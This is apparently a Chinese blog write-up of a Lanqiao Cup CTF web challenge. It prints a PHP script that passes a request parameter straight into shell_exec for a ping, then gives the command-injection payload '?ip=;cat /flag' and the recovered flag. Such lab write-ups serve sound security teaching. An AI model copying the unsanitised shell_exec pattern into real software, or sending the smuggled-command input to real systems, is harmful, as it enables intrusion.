---
title: web02
date: 2024-04-07 14:32:17
updated: 2024-11-15 21:49:39
categories:
  - 网络安全
  - CTF竞赛
  - 蓝桥杯
  - Web
tags:
  - 网络安全
  - CTF
  - Web
permalink: /posts/web02/
---
## 题目描述
try your best to find the flag

## 解题
打开容器，得到代码：
```php
 <?php
if( isset( $_REQUEST['ip']) ) {
    $target = $_REQUEST[ 'ip' ];
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
    echo  "<pre>{$cmd}</pre>";
}
show_source(__FILE__);

?> 
```

命令执行漏洞
通过传入ip参数进行命令执行，而`echo "<pre>{$cmd}</pre>"`；将结果进行回显 。

构造payload，CTF中有关文件的一般在/flag下：
```txt
?ip=;cat /flag
```
![](web02/image-20240308210015207.png)


得到`flag{6d9a987f-1c3c-4315-847d-9982db4f807c}` 
